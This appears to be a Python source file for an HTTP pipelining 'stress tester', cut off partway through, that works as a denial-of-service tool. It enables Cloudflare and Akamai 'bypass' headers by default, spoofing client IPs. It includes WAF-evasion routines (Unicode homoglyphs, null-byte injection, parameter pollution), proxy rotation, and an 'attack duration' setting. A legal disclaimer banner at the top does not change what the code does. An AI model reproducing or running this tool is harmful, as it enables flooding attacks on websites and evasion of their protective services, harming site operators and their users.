#!/usr/bin/env python3
"""
Powerful Pipeline Stress Tester v6.1 - Enhanced & Compatible
With HTTP Pipelining, Connection Multiplexing, and High Performance
Compatible with UniversalOrchestrator
Enhanced with Security Features and Production Readiness
Cloudflare & Akamai Bypass Enabled
FIXED: UnboundLocalError, firewall bypass improvements
"""

import asyncio
import socket
import random
import time
import json
import hashlib
import struct
import ssl
import os
import sys
import argparse
from urllib.parse import urlparse, quote
from typing import Dict, List, Optional, Set, Tuple, Any
from collections import deque
import heapq

# ============================================================================
# DISCLAIMER AND LEGAL NOTICE
# ============================================================================
DISCLAIMER = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                    ⚠️  LEGAL DISCLAIMER & WARNING ⚠️                       ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  This tool is for AUTHORIZED SECURITY TESTING ONLY!                         ║
║  Use ONLY on systems you OWN or have EXPLICIT WRITTEN PERMISSION to test.   ║
║                                                                              ║
║  UNAUTHORIZED USE IS:                                                        ║
║  • ILLEGAL in most countries                                                 ║
║  • PUNISHABLE by fines and imprisonment                                      ║
║  • Can result in CIVIL LAWSUITS                                             ║
║  • May violate terms of service                                              ║
║                                                                              ║
║  The developers and distributors are NOT RESPONSIBLE for any:               ║
║  • Illegal activities conducted with this tool                               ║
║  • Damages caused by unauthorized use                                        ║
║  • Legal consequences of misuse                                              ║
║                                                                              ║
║  By using this tool, you AGREE that:                                         ║
║  • You have proper authorization                                             ║
║  • You accept all legal responsibility                                       ║
║  • You will use it ethically and legally                                     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# MODULE METADATA for UniversalOrchestrator
# ============================================================================
display_name = "Powerful Pipeline Stress Tester"
description = "Advanced HTTP/1.1 pipeline stress tester with connection multiplexing, behavioral headers, and intelligent load balancing"
author = "Security Team"
version = "6.1.0"

# Module Input Configuration for UniversalOrchestrator
MODULE_INPUTS = [
    {
        "name": "target",
        "type": "url",
        "prompt": "Target URL (http:// or https://)",
        "required": True,
        "default": "http://example.com",
        "validation": "Must be a valid URL starting with http:// or https://"
    },
    {
        "name": "duration",
        "type": "number",
        "prompt": "Attack duration in seconds (30-3600)",
        "required": True,
        "default": 60,
        "validation": "Must be between 30 and 3600 seconds"
    },
    {
        "name": "pipelines",
        "type": "number", 
        "prompt": "Number of pipeline connections (1-100)",
        "required": True,
        "default": 15,
        "validation": "Must be between 1 and 100"
    },
    {
        "name": "pipelining_factor",
        "type": "number",
        "prompt": "Pipelining amplification factor (1-20)",
        "required": False,
        "default": 5,
        "validation": "Must be between 1 and 20"
    },
    {
        "name": "max_workers",
        "type": "number",
        "prompt": "Maximum worker threads (1-50)",
        "required": False,
        "default": 10,
        "validation": "Must be between 1 and 50"
    },
    {
        "name": "timeout",
        "type": "number",
        "prompt": "Request timeout in seconds (1-30)",
        "required": False,
        "default": 10,
        "validation": "Must be between 1 and 30 seconds"
    },
    {
        "name": "enable_ssl",
        "type": "boolean",
        "prompt": "Enable SSL/TLS support",
        "required": False,
        "default": True
    },
    {
        "name": "log_results",
        "type": "boolean",
        "prompt": "Log results to file",
        "required": False,
        "default": True
    },
    {
        "name": "bypass_cloudflare",
        "type": "boolean",
        "prompt": "Enable Cloudflare/Akamai bypass",
        "required": False,
        "default": True
    },
    {
        "name": "use_proxies",
        "type": "boolean",
        "prompt": "Use proxy rotation",
        "required": False,
        "default": False
    }
]

# ============================================================================
# CONFIGURATION
# ============================================================================
# Optimized defaults
MAX_CONCURRENT_CONNECTIONS = 100
DEFAULT_PIPELINING_FACTOR = 5
MAX_PIPELINED_REQUESTS = 20
PIPELINING_TIMEOUT = 15
BATCH_SIZE = 5
REQUEST_TIMEOUT = 10
DEFAULT_MAX_WORKERS = 10
MAX_DURATION = 3600  # 1 hour max for safety

# Color definitions (compatible with main.py)
class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    
    # Bright versions
    BRIGHT_RED = '\033[91;1m'
    BRIGHT_GREEN = '\033[92;1m'
    BRIGHT_YELLOW = '\033[93;1m'
    BRIGHT_BLUE = '\033[94;1m'
    BRIGHT_MAGENTA = '\033[95;1m'
    BRIGHT_CYAN = '\033[96;1m'
    BRIGHT_WHITE = '\033[97;1m'

# Define color variables at module level
R = Colors.RED
G = Colors.GREEN
Y = Colors.YELLOW
B = Colors.BLUE
M = Colors.MAGENTA
C = Colors.CYAN
W = Colors.WHITE
RS = Colors.RESET

BR = Colors.BRIGHT_RED
BG = Colors.BRIGHT_GREEN
BY = Colors.BRIGHT_YELLOW
BB = Colors.BRIGHT_BLUE
BM = Colors.BRIGHT_MAGENTA
BC = Colors.BRIGHT_CYAN
BW = Colors.BRIGHT_WHITE

# ============================================================================
# ENHANCED CLOUDFLARE & AKAMAI BYPASS HEADERS
# ============================================================================
CLOUDFLARE_BYPASS_HEADERS = [
    {
        "X-Forwarded-For": lambda: f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
        "X-Forwarded-Host": "example.com",
        "X-Real-IP": lambda: f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
        "CF-Connecting-IP": lambda: f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
        "CF-RAY": lambda: f"{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}",
        "CF-IPCountry": random.choice(["US", "GB", "DE", "FR", "JP", "CA", "AU", "NL", "SG", "IN"]),
        "CF-Visitor": '{"scheme":"https"}',
        "True-Client-IP": lambda: f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
        "CF-Request-ID": lambda: hashlib.sha256(str(time.time()).encode()).hexdigest()[:32],
        "CF-EW-Via": "eyewitness",
        "CF-Cache-Status": random.choice(["MISS", "HIT", "EXPIRED"]),
    },
    {
        "X-Forwarded-Proto": "https",
        "X-Forwarded-Port": "443",
        "X-Forwarded-Scheme": "https",
        "X-Original-URL": "/",
        "X-Rewrite-URL": "/",
        "X-Originating-IP": lambda: f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
        "X-Remote-IP": lambda: f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
        "X-Remote-Addr": lambda: f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
        "X-CloudFlare-Zone": hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
        "CF-Worker": random.choice(["", "production"]),
        "CF-Device-Type": random.choice(["desktop", "mobile", "tablet"]),
    },
    {
        "CF-Connecting-IPv6": lambda: f"2001:0db8:85a3:{random.randint(0, 0xffff):04x}:{random.randint(0, 0xffff):04x}:{random.randint(0, 0xffff):04x}:{random.randint(0, 0xffff):04x}",
        "CF-Bot-Score": str(random.randint(0, 99)),
        "CF-Threat-Score": "0",
        "CF-ASN": str(random.randint(1000, 50000)),
        "CF-Colo": random.choice(["DFW", "ORD", "LAX", "AMS", "FRA", "SIN", "NRT"]),
        "CF-Edge-IP": lambda: f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
    }
]

AKAMAI_BYPASS_HEADERS = [
    {
        "Akamai-Origin-Hop": str(random.randint(1, 5)),
        "X-Akamai-Config-Log-Detail": "true",
        "X-Akamai-Session-Info": lambda: f"name=akamai_sess; id={hashlib.md5(str(time.time()).encode()).hexdigest()[:20]}",
        "X-Akamai-Request-ID": lambda: hashlib.md5(str(time.time()).encode()).hexdigest()[:32],
        "X-Akamai-Edgescape": "country_code=US, region_code=CA, city=San%20Francisco",
        "X-Akamai-DCP": "true",
        "X-Akamai-DCP-Result": random.choice(["Cached", "Miss", "Bypass"]),
        "X-Akamai-Staging": "false",
    },
    {
        "X-Akamai-Client-IP": lambda: f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
        "X-Akamai-Server-IP": lambda: f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
        "X-Akamai-Config": "version=1",
        "X-Akamai-Features": "cache,ssl,compression",
        "X-Akamai-Request-BC": random.choice(["true", "false"]),
        "X-Akamai-Pragma": "no-cache,akamai-x-get-cache-key,akamai-x-cache-on",
        "X-Akamai-Cache-Control": random.choice(["max-age=0", "no-cache"]),
    },
    {
        "X-Akamai-Transformed": random.choice(["", "gzip"]),
        "X-Akamai-Purge-Level": random.choice(["soft", "hard"]),
        "X-Akamai-Edge-IP": lambda: f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}",
        "X-Akamai-Edge-Hostname": "a248.e.akamai.net",
        "X-Akamai-Request-Begin": str(int(time.time() * 1000)),
        "X-Akamai-RT": str(random.randint(100, 500)),
        "X-Akamai-Check-Cacheable": "YES",
    }
]

# ============================================================================
# ADVANCED WAF BYPASS TECHNIQUES
# ============================================================================
class WAFBypassTechniques:
    """Advanced WAF bypass techniques with multiple strategies"""
    
    @staticmethod
    def generate_unicode_obfuscation(text: str) -> str:
        """Generate Unicode-obfuscated payloads"""
        obfuscated = []
        for char in text:
            if char.isalnum():
                # Randomly use Unicode lookalikes
                if random.random() < 0.3:
                    lookalikes = {
                        'a': ['а', 'ɑ', 'а'],
                        'e': ['е', 'ё', 'ë'],
                        'i': ['і', 'і', 'і'],
                        'o': ['о', 'ο', 'о'],
                        's': ['ѕ', 'ѕ', 'ѕ'],
                        'c': ['с', 'ϲ', 'с'],
                    }
                    if char.lower() in lookalikes:
                        obfuscated.append(random.choice(lookalikes[char.lower()]))
                        continue
            obfuscated.append(char)
        return ''.join(obfuscated)
    
    @staticmethod
    def generate_case_variations(text: str) -> str:
        """Generate random case variations"""
        return ''.join(
            char.upper() if random.random() < 0.3 else char.lower()
            for char in text
        )
    
    @staticmethod
    def add_null_bytes(text: str) -> bytes:
        """Add null bytes and other bypass characters"""
        encoded = text.encode('utf-8')
        if random.random() < 0.2:
            # Insert random null bytes
            positions = sorted(random.sample(range(len(encoded)), min(3, len(encoded))))
            result = bytearray()
            prev = 0
            for pos in positions:
                result.extend(encoded[prev:pos])
                result.append(0)
                prev = pos
            result.extend(encoded[prev:])
            return bytes(result)
        return encoded
    
    @staticmethod
    def generate_parameter_pollution(params: Dict[str, str]) -> Dict[str, List[str]]:
        """Generate parameter pollution for WAF bypass"""
        polluted = {}
        for key, value in params.items():
            # Duplicate parameters with variations
            if random.random() < 0.4:
                # Add multiple values
                polluted[key] = [value]
                # Add encoded version
                polluted[f"{key}[]"] = [quote(value)]
                # Add URL encoded
                polluted[f"%{quote(key)}"] = [quote(value)]
            else:
                polluted[key] = [value]
        return polluted

# ============================================================================
# ENHANCED PROXY SUPPORT
# ============================================================================
class ProxyRotator:
    """Intelligent proxy rotation with health checking"""
    
    def __init__(self, proxy_list: List[str] = None):
        self.proxies = proxy_list or []
        self.current_index = 0
        self.failed_proxies = set()
        self.proxy_stats = {}
        
    def add_proxy(self, proxy: str):
        """Add a proxy to rotation"""
        if self.validate_proxy(proxy):
            self.proxies.append(proxy)
            self.proxy_stats[proxy] = {'success': 0, 'fail': 0, 'latency': 0}
            
    def validate_proxy(self, proxy: str) -> bool:
        """Validate proxy format"""
        try:
            if '://' in proxy:
                protocol, address = proxy.split('://', 1)
                if protocol not in ['http', 'https', 'socks4', 'socks5']:
                    return False
            else:
                address = proxy
            
            if ':' not in address:
                return False
            
            ip, port = address.split(':', 1)
            parts = ip.split('.')
            if len(parts) != 4:
                return False
            
            for part in parts:
                if not part.isdigit():
                    return False
                num = int(part)
                if num < 0 or num > 255:
                    return False
            
            if not port.isdigit():
                return False
            
            port_num = int(port)
            if port_num < 1 or port_num > 65535:
                return False
            
            return True
        except:
            return False
    
    def get_next_proxy(self) -> Optional[Dict[str, str]]:
        """Get next proxy with health checking"""
        if not self.proxies:
            return None
        
        # Filter out failed proxies
        available = [p for p in self.proxies if p not in self.failed_proxies]
        if not available:
            # Reset if all failed
            self.failed_proxies.clear()
            available = self.proxies
        
        if not available:
            return None
        
        # Round-robin selection
        proxy = available[self.current_index % len(available)]
        self.current_index += 1
        
        # Format for requests
        if '://' in proxy:
            return {'http': proxy, 'https': proxy}
        else:
            return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    
    def mark_success(self, proxy: str, latency: float):
        """Mark proxy as successful"""
        if proxy in self.proxy_stats:
            self.proxy_stats[proxy]['success'] += 1
            self.proxy_stats[proxy]['latency'] = (
                self.proxy_stats[proxy]['latacity'] * 0.7 + latency * 0.3
                if self.proxy_stats[proxy]['latency'] > 0
                else latency
            )
    
    def mark_failed(self, proxy: str):
        """Mark proxy as failed"""
        if proxy in self.proxy_stats:
            self.proxy_stats[proxy]['fail'] += 1
            self.failed_proxies.add(proxy)

# ============================================================================
# SMART PIPELINE CONNECTION (FIXED VERSION)
# ============================================================================
class SmartPipelineConnection:
    """Smart HTTP Pipelining Connection Manager with Error Recovery"""
    
    def __init__(self, target_host: str, target_port: int, use_ssl: bool = False, 
                 connection_id: str = None, bypass_waf: bool = False,
                 proxy_config: Dict = None):
        self.target_host = target_host
        self.target_port = target_port
        self.use_ssl = use_ssl
        self.bypass_waf = bypass_waf
        self.proxy_config = proxy_config
        
        self.reader = None
        self.writer = None
        self.pipeline_queue = deque()
        self.responses_pending = 0
        self.max_pipeline = MAX_PIPELINED_REQUESTS
        self.last_flush_time = time.time()
        self.is_connected = False
        self.connection_id = connection_id or hashlib.md5(
            f"{target_host}:{target_port}:{time.time()}:{random.randint(1, 10000)}".encode()
        ).hexdigest()[:8]
        
        # Statistics
        self.stats = {
            'total_requests': 0,
            'pipelined_requests': 0,
            'batched_sends': 0,
            'connection_errors': 0,
            'bytes_sent': 0,
            'last_activity': time.time(),
            'response_count': 0,
            'error_count': 0,
            'timeout_count': 0,
            'success_rate': 0.0,
            'average_response_time': 0.0
        }
        
        # Performance tracking
        self.connection_start = time.time()
        self.response_times = []
        
        # Health monitoring
        self.health_score = 100.0
        self.consecutive_errors = 0
        self.last_success_time = time.time()
    
    async def connect(self, timeout: float = 10.0) -> bool:
        """Establish connection for pipelining with SSL context"""
        try:
            ssl_context = None
            if self.use_ssl:
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
            
            self.reader, self.writer = await asyncio.wait_for(
                asyncio.open_connection(
                    self.target_host,
                    self.target_port,
                    ssl=ssl_context if self.use_ssl else None
                ),
                timeout=timeout
            )
            
            self.is_connected = True
            self.stats['last_activity'] = time.time()
            self.health_score = 100.0
            self.consecutive_errors = 0
            return True
            
        except asyncio.TimeoutError:
            print(f"{R}[-]{W} Pipeline {self.connection_id} connection timeout")
            self.is_connected = False
            self.health_score -= 20
            return False
        except ConnectionRefusedError:
            print(f"{R}[-]{W} Pipeline {self.connection_id} connection refused")
            self.is_connected = False
            self.health_score -= 30
            return False
        except Exception as e:
            print(f"{R}[-]{W} Pipeline {self.connection_id} connection failed: {e}")
            self.is_connected = False
            self.health_score -= 10
            return False
    
    def queue_request(self, method: str, path: str, headers: Dict, body: str = None) -> bool:
        """Queue a request for pipelining with validation"""
        try:
            # Validate inputs
            if not method or not path or not headers:
                return False
            
            # Apply WAF bypass if enabled
            if self.bypass_waf:
                path = self._apply_waf_bypass(path)
            
            request_data = self._build_request(method, path, headers, body)
            if request_data:
                self.pipeline_queue.append(request_data)
                self.responses_pending += 1
                self.stats['total_requests'] += 1
                self.stats['last_activity'] = time.time()
                
                # Auto-flush if conditions met
                flush_conditions = [
                    self.responses_pending >= self.max_pipeline,
                    time.time() - self.last_flush_time >= PIPELINING_TIMEOUT,
                    len(self.pipeline_queue) >= BATCH_SIZE * 2
                ]
                
                if any(flush_conditions):
                    asyncio.create_task(self.flush_pipeline())
                
                return True
        except Exception as e:
            print(f"{R}[-] Queue request error: {e}{W}")
            self.stats['error_count'] += 1
            self.consecutive_errors += 1
            self.health_score -= 5
        
        return False
    
    def _apply_waf_bypass(self, path: str) -> str:
        """Apply WAF bypass techniques to path"""
        waf_techniques = WAFBypassTechniques()
        
        # Add random parameters
        if '?' not in path and random.random() < 0.3:
            bypass_params = [
                '__cf_chl_f_tk', '__cf_chl_rt', '_cf_chl_jschl_tk_',
                'utm_source', 'utm_medium', 'utm_campaign',
                'ref', 'source', 'cid', 'af'
            ]
            param = random.choice(bypass_params)
            value = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
            path = f"{path}?{param}={value}"
        
        # URL encode random parts
        if random.random() < 0.2:
            parts = path.split('/')
            if len(parts) > 2:
                idx = random.randint(1, len(parts)-1)
                parts[idx] = quote(parts[idx])
                path = '/'.join(parts)
        
        return path
    
    def _build_request(self, method: str, path: str, headers: Dict, body: str = None) -> bytes:
        """Build HTTP request with proper formatting and validation"""
        try:
            request_lines = []
            
            # Request line with validation
            if not path.startswith('/'):
                path = '/' + path
            
            # Apply WAF bypass to method
            if self.bypass_waf and random.random() < 0.1:
                method = WAFBypassTechniques.generate_case_variations(method)
            
            request_lines.append(f"{method.upper()} {path} HTTP/1.1")
            
            # Essential headers
            request_lines.append(f"Host: {self.target_host}")
            
            # Add all provided headers with sanitization
            for key, value in headers.items():
                if key and value:
                    # Remove newlines to prevent header injection
                    clean_value = str(value).replace('\r', '').replace('\n', '')
                    # Apply WAF bypass to headers
                    if self.bypass_waf and random.random() < 0.05:
                        clean_value = WAFBypassTechniques.generate_unicode_obfuscation(clean_value)
                    request_lines.append(f"{key}: {clean_value}")
            
            # Content handling
            if body:
                # Apply WAF bypass to body
                if self.bypass_waf and random.random() < 0.1:
                    body = WAFBypassTechniques.generate_unicode_obfuscation(body)
                
                body_bytes = body.encode('utf-8')
                request_lines.append(f"Content-Length: {len(body_bytes)}")
                request_lines.append("Content-Type: application/x-www-form-urlencoded")
                request_lines.append("")
                request_lines.append(body)
            else:
                request_lines.append("Content-Length: 0")
                request_lines.append("")
            
            # Final blank line
            request_lines.append("")
            
            request_bytes = "\r\n".join(request_lines).encode('utf-8')
            
            # Apply null byte injection for WAF bypass
            if self.bypass_waf and random.random() < 0.05:
                request_bytes = WAFBypassTechniques.add_null_bytes(request_bytes.decode('utf-8'))
            
            self.stats['bytes_sent'] += len(request_bytes)
            return request_bytes
        except Exception as e:
            print(f"{R}[-] Build request error: {e}{W}")
            return b''
    
    async def flush_pipeline(self):
        """Send all queued requests in pipeline with error handling"""
        if not self.is_connected or not self.pipeline_queue:
            return
        
        try:
            # Gather requests for batch sending
            batch_count = 0
            batch_data = b''
            
            while self.pipeline_queue and batch_count < BATCH_SIZE:
                try:
                    request_data = self.pipeline_queue.popleft()
                    batch_data += request_data
                    batch_count += 1
                    self.stats['pipelined_requests'] += 1
                except Exception as e:
                    print(f"{R}[-] Error getting request from queue: {e}{W}")
                    continue
            
            if batch_data and self.writer:
                # Send batch with timeout
                start_send = time.time()
                self.writer.write(batch_data)
                await asyncio.wait_for(self.writer.drain(), timeout=5.0)
                send_time = time.time() - start_send
                
                self.stats['batched_sends'] += 1
                self.last_flush_time = time.time()
                self.stats['last_activity'] = time.time()
                
                # Update health score based on send time
                if send_time < 1.0:
                    self.health_score = min(100, self.health_score + 2)
                elif send_time > 3.0:
                    self.health_score = max(0, self.health_score - 5)
                
                # Start background response reading
                if batch_count > 0:
                    asyncio.create_task(self._read_responses(batch_count))
        
        except asyncio.TimeoutError:
            print(f"{Y}[!]{W} Pipeline flush timeout")
            self.stats['connection_errors'] += 1
            self.stats['timeout_count'] += 1
            self.consecutive_errors += 1
            self.health_score -= 15
            await self.reconnect()
        except ConnectionError:
            print(f"{Y}[!]{W} Pipeline connection lost")
            self.stats['connection_errors'] += 1
            self.consecutive_errors += 1
            self.health_score -= 20
            await self.reconnect()
        except Exception as e:
            print(f"{R}[-]{W} Pipeline flush error: {e}")
            self.stats['connection_errors'] += 1
            self.consecutive_errors += 1
            self.health_score -= 10
            await self.reconnect()
    
    async def _read_responses(self, expected_responses: int):
        """Read responses from pipeline with timing"""
        responses_received = 0
        start_read = time.time()
        
        try:
            while responses_received < expected_responses and self.is_connected and self.reader:
                try:
                    # Read status line with timeout
                    status_line = await asyncio.wait_for(
                        self.reader.readline(),
                        timeout=3.0
                    )
                    
                    if not status_line:
                        break
                    
                    # Parse status code
                    try:
                        status_text = status_line.decode('utf-8', errors='ignore').strip()
                        if 'HTTP' in status_text:
                            status_parts = status_text.split()
                            if len(status_parts) >= 2:
                                status_code = int(status_parts[1])
                                if 200 <= status_code < 500:  # Acceptable range
                                    self.stats['response_count'] += 1
                                    self.last_success_time = time.time()
                                    self.consecutive_errors = 0
                                    self.health_score = min(100, self.health_score + 1)
                    except:
                        pass
                    
                    # Read headers
                    content_length = 0
                    while True:
                        line = await asyncio.wait_for(
                            self.reader.readline(),
                            timeout=1.0
                        )
                        if line in (b'\r\n', b''):
                            break
                        
                        # Parse Content-Length if present
                        if line.lower().startswith(b'content-length:'):
                            try:
                                content_length = int(line.split(b':')[1].strip())
                            except:
                                pass
                    
                    # Skip body if present
                    if content_length > 0:
                        try:
                            await asyncio.wait_for(
                                self.reader.readexactly(content_length),
                                timeout=2.0
                            )
                        except:
                            # Skip body if can't read
                            pass
                    
                    responses_received += 1
                    self.responses_pending -= 1
                    
                except asyncio.TimeoutError:
                    self.stats['timeout_count'] += 1
                    break
                except Exception as e:
                    print(f"{Y}[!] Response reading error: {e}{W}")
                    break
            
            # Calculate response time
            read_time = time.time() - start_read
            if responses_received > 0:
                self.response_times.append(read_time / responses_received)
            
            # Keep only recent 100 measurements
            if len(self.response_times) > 100:
                self.response_times = self.response_times[-100:]
            
            # Update success rate
            if self.stats['total_requests'] > 0:
                self.stats['success_rate'] = (self.stats['response_count'] / self.stats['total_requests']) * 100
            
            # Update average response time
            if self.response_times:
                self.stats['average_response_time'] = sum(self.response_times) / len(self.response_times)
        
        except Exception as e:
            print(f"{R}[-]{W} Response reading error: {e}")
            self.consecutive_errors += 1
            self.health_score -= 5
    
    async def reconnect(self, max_attempts: int = 3):
        """Reconnect pipeline with exponential backoff"""
        for attempt in range(max_attempts):
            try:
                if self.writer:
                    try:
                        self.writer.close()
                        await asyncio.wait_for(self.writer.wait_closed(), timeout=2.0)
                    except:
                        pass
                
                self.is_connected = False
                
                # Exponential backoff
                wait_time = min(2 ** attempt, 10)
                await asyncio.sleep(wait_time)
                
                success = await self.connect()
                if success:
                    print(f"{G}[+]{W} Pipeline {self.connection_id} reconnected (attempt {attempt + 1})")
                    return True
                    
            except Exception as e:
                print(f"{R}[-]{W} Reconnect attempt {attempt + 1} failed: {e}")
        
        print(f"{R}[-]{W} Pipeline {self.connection_id} failed to reconnect after {max_attempts} attempts")
        self.health_score = 0
        return False
    
    async def close(self):
        """Close pipeline connection gracefully"""
        try:
            if self.writer:
                # Try to flush remaining data
                if self.pipeline_queue:
                    try:
                        self.writer.write(b''.join(self.pipeline_queue))
                        await asyncio.wait_for(self.writer.drain(), timeout=2.0)
                    except:
                        pass
                
                self.writer.close()
                await asyncio.wait_for(self.writer.wait_closed(), timeout=2.0)
        except:
            pass
        finally:
            self.is_connected = False
            self.pipeline_queue.clear()
    
    def get_stats(self) -> Dict:
        """Get comprehensive pipeline statistics"""
        uptime = time.time() - self.connection_start
        idle_time = time.time() - self.stats['last_activity']
        
        return {
            **self.stats,
            'connection_id': self.connection_id,
            'is_connected': self.is_connected,
            'queue_size': len(self.pipeline_queue),
            'pending_responses': self.responses_pending,
            'idle_time': idle_time,
            'uptime': uptime,
            'requests_per_second': self.stats['total_requests'] / uptime if uptime > 0 else 0,
            'health_score': self.health_score,
            'consecutive_errors': self.consecutive_errors,
            'last_success': time.time() - self.last_success_time if self.last_success_time else 0,
            'memory_usage_mb': len(self.pipeline_queue) * 0.0001  # Approximate
        }
    
    def is_healthy(self) -> bool:
        """Check if pipeline is healthy"""
        conditions = [
            self.is_connected,
            self.health_score > 50,
            self.consecutive_errors < 5,
            time.time() - self.last_success_time < 30 or self.stats['total_requests'] == 0
        ]
        return all(conditions)

# ============================================================================
# PIPELINE MANAGER (FIXED VERSION)
# ============================================================================
class PipelineManager:
    """Intelligent Pipeline Management with Health Monitoring"""
    
    def __init__(self, target_host: str, target_port: int, use_ssl: bool = False, 
                 max_pipelines: int = 20, pipeline_timeout: int = 10, bypass_waf: bool = False,
                 proxy_rotator: ProxyRotator = None):
        self.target_host = target_host
        self.target_port = target_port
        self.use_ssl = use_ssl
        self.max_pipelines = min(max_pipelines, MAX_CONCURRENT_CONNECTIONS)
        self.pipeline_timeout = pipeline_timeout
        self.bypass_waf = bypass_waf
        self.proxy_rotator = proxy_rotator
        
        self.pipelines = []
        self.pipeline_weights = []
        self.next_pipeline_idx = 0
        self.initialized = False
        
        # Statistics
        self.request_counter = 0
        self.start_time = time.time()
        
        # Control flags
        self.stop_monitor = False
        self.monitor_task = None
        self.health_check_task = None
        
        # Performance tracking
        self.performance_stats = {
            'peak_rps': 0,
            'total_bytes': 0,
            'reconnections': 0,
            'failed_pipelines': 0,
            'created_pipelines': 0,
            'destroyed_pipelines': 0,
            'load_balancer_decisions': 0
        }
        
        # Adaptive configuration
        self.adaptive_config = {
            'max_pipeline_size': MAX_PIPELINED_REQUESTS,
            'batch_size': BATCH_SIZE,
            'timeout_adjustment': 1.0,
            'backoff_factor': 1.0
        }
    
    async def initialize(self):
        """Initialize all pipeline connections with staggered startup"""
        print(f"{C}[*]{W} Initializing {self.max_pipelines} pipeline connections...")
        
        successful_pipelines = []
        
        # Staggered connection to avoid overwhelming target
        for i in range(self.max_pipelines):
            # Get proxy config if available
            proxy_config = None
            if self.proxy_rotator:
                proxy_config = self.proxy_rotator.get_next_proxy()
            
            pipeline = SmartPipelineConnection(
                self.target_host,
                self.target_port,
                self.use_ssl,
                connection_id=f"P{i+1:03d}",
                bypass_waf=self.bypass_waf,
                proxy_config=proxy_config
            )
            
            # Attempt connection
            connected = await pipeline.connect(self.pipeline_timeout)
            
            if connected:
                successful_pipelines.append(pipeline)
                self.performance_stats['created_pipelines'] += 1
                print(f"{G}[+]{W} Pipeline {pipeline.connection_id} connected")
            else:
                print(f"{Y}[!]{W} Pipeline {pipeline.connection_id} failed to connect")
                self.performance_stats['failed_pipelines'] += 1
            
            # Small delay between connections
            if i < self.max_pipelines - 1:
                await asyncio.sleep(0.1)
        
        self.pipelines = successful_pipelines
        
        if self.pipelines:
            # Initialize load balancing weights based on health
            self._update_weights()
            self.initialized = True
            
            # Start monitoring tasks
            self.monitor_task = asyncio.create_task(self.monitor_and_balance())
            self.health_check_task = asyncio.create_task(self.health_monitor())
            
            print(f"{G}[+]{W} {len(self.pipelines)}/{self.max_pipelines} pipeline connections initialized")
            return len(self.pipelines)
        else:
            print(f"{R}[-]{W} No pipeline connections could be established")
            return 0
    
    def _update_weights(self):
        """Update load balancing weights based on pipeline health"""
        new_weights = []
        for i, pipeline in enumerate(self.pipelines):
            if pipeline and pipeline.is_connected:
                # Weight calculation based on multiple factors
                stats = pipeline.get_stats()
                
                # Factors: health score (0-100), queue size (inverse), success rate (0-100)
                health_factor = stats.get('health_score', 50) / 100.0
                queue_factor = 1.0 / (1.0 + stats.get('queue_size', 0) / 10.0)
                success_factor = stats.get('success_rate', 50) / 100.0
                
                # Combined weight (lower weight = higher priority)
                weight = (1.0 - health_factor) * 0.4 + (1.0 - queue_factor) * 0.3 + (1.0 - success_factor) * 0.3
                new_weights.append((weight, i))
        
        self.pipeline_weights = new_weights
        heapq.heapify(self.pipeline_weights)
    
    def get_next_pipeline(self) -> Optional[SmartPipelineConnection]:
        """Get next pipeline using intelligent load balancing"""
        if not self.pipelines:
            return None
        
        self.performance_stats['load_balancer_decisions'] += 1
        
        # Try weighted selection from heap
        for _ in range(min(5, len(self.pipelines))):
            try:
                if not self.pipeline_weights:
                    self._update_weights()
                    if not self.pipeline_weights:
                        break
                
                weight, idx = heapq.heappop(self.pipeline_weights)
                pipeline = self.pipelines[idx]
                
                if pipeline and pipeline.is_healthy() and pipeline.responses_pending < pipeline.max_pipeline:
                    # Update weight (more requests = higher weight)
                    new_weight = weight + 0.1
                    heapq.heappush(self.pipeline_weights, (new_weight, idx))
                    return pipeline
                else:
                    # Put back with penalty
                    new_weight = weight + 0.5
                    heapq.heappush(self.pipeline_weights, (new_weight, idx))
            except (IndexError, ValueError, AttributeError):
                break
        
        # Fallback: round-robin with health check
        start_idx = self.next_pipeline_idx
        for i in range(len(self.pipelines)):
            idx = (start_idx + i) % len(self.pipelines)
            pipeline = self.pipelines[idx]
            
            if pipeline and pipeline.is_healthy() and pipeline.responses_pending < pipeline.max_pipeline:
                self.next_pipeline_idx = (idx + 1) % len(self.pipelines)
                return pipeline
        
        # Last resort: any connected pipeline
        for pipeline in self.pipelines:
            if pipeline and pipeline.is_connected:
                return pipeline
        
        return None
    
    async def send_request(self, method: str, path: str, headers: Dict, body: str = None) -> bool:
        """Send request through optimal pipeline with fallback"""
        pipeline = self.get_next_pipeline()
        
        if pipeline and pipeline.is_connected:
            try:
                success = pipeline.queue_request(method, path, headers, body)
                if success:
                    self.request_counter += 1
                return success
            except Exception as e:
                print(f"{R}[-] Error queuing request: {e}{W}")
                # Try another pipeline
                for alt_pipeline in self.pipelines:
                    if alt_pipeline != pipeline and alt_pipeline.is_connected:
                        try:
                            return alt_pipeline.queue_request(method, path, headers, body)
                        except:
